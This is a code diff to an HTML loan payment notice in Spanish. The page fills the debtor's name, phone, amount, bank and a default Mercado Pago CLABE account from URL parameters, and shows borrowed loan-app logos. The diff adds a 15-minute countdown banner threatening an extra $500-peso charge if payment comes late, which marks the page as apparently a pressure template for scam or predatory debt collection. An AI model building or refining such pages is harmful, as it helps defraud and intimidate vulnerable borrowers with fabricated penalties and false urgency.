@@ -30,9 +30,9 @@
         </div>
 
         <div style="padding: 25px;">
-            <div style="margin-bottom: 20px; text-align: center; border-bottom: 1px solid #eee; pb-4;">
+            <div style="margin-bottom: 20px; text-align: center; border-bottom: 1px solid #eee; padding-bottom: 15px;">
                 <p id="txt-nombre" style="font-size: 16px; font-weight: 900; color: #1e293b; text-transform: uppercase;">NOMBRE CLIENTE</p>
-                <p id="txt-tel" style="font-size: 12px; font-weight: 700; color: #64748b; margin-top: 4px;">000 000 0000</p>
+                <p id="txt-tel" style="font-size: 18px; font-weight: 800; color: #475569; margin-top: 6px; letter-spacing: 1px;">000 000 0000</p>
             </div>
 
             <div style="background-color: #f8fafc; border-radius: 30px; padding: 20px 10px; text-align: center; border: 1px solid #f1f5f9; margin-bottom: 20px;">
@@ -45,9 +45,14 @@
                     <span style="font-size: 10px; font-weight: 800; color: #ef4444; text-transform: uppercase;">Vence el:</span>
                     <span id="txt-fecha" style="font-size: 12px; font-weight: 900; color: #ef4444;">--/--/----</span>
                 </div>
-                <div style="display: flex; justify-content: space-between; align-items: center;">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                     <span id="timer-label" style="font-size: 10px; font-weight: 800; color: #ef4444; text-transform: uppercase;">Expira en:</span>
                     <span id="timer" style="font-size: 20px; font-weight: 900; color: #ef4444;">15:00</span>
+                </div>
+                <div style="background: #ef4444; color: white; padding: 8px; border-radius: 12px; text-align: center;">
+                    <p style="font-size: 9px; font-weight: 800; text-transform: uppercase; line-height: 1.2;">
+                        Evite un cargo adicional de $500.00 pesos realizando su pago antes de que el cronómetro llegue a cero.
+                    </p>
                 </div>
             </div>
 
@@ -64,7 +69,6 @@
     </div>
 
     <script>
-        // Configuración de productos (Estilos y Logos)
         const config = {
             'prestamos': { n: 'Préstamos', c: '#a3e635', mc: '#65a30d', l: 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/cb/a8/7a/cba87ab7-2fe9-aad7-e49f-a367d6c410b4/AppIcon-1x_U007ephone-0-1-0-85-220-0.jpeg/1200x630wa.png' },
             'dinero': { n: 'Préstamos de Dinero', c: '#1e40af', mc: '#1e40af', l: 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/cb/a8/7a/cba87ab7-2fe9-aad7-e49f-a367d6c410b4/AppIcon-1x_U007ephone-0-1-0-85-220-0.jpeg/1200x630wa.png' },
@@ -77,28 +81,22 @@
         };
 
         const urlParams = new URLSearchParams(window.location.search);
-        
-        // Cargar Producto
         const prodId = urlParams.get('v') || 'prestamos';
         const item = config[prodId] || config['prestamos'];
         
-        // Aplicar Estilos y Textos
         document.getElementById('header-color').style.backgroundColor = item.c;
         document.getElementById('img-final').src = item.l;
         document.getElementById('txt-prod').innerText = item.n;
         document.getElementById('txt-monto').style.color = item.mc;
 
-        // Datos del Pago
         document.getElementById('txt-monto').innerText = "$" + (urlParams.get('m') || "0.00");
         document.getElementById('txt-nombre').innerText = urlParams.get('n') || "CLIENTE";
         document.getElementById('txt-tel').innerText = urlParams.get('t') || "S/N";
         document.getElementById('txt-fecha').innerText = urlParams.get('f') || "--/--/----";
         
-        // Datos Bancarios
         document.getElementById('txt-banco-nombre').innerText = urlParams.get('b') || "MERCADO PAGO";
         document.getElementById('txt-clabe').innerText = urlParams.get('c') || "722969010005687921";
 
-        // Cronómetro de 15 minutos
         const start = parseInt(urlParams.get('s')) || Date.now();
         function updateTimer() {
             const diff = (15 * 60 * 1000) - (Date.now() - start);
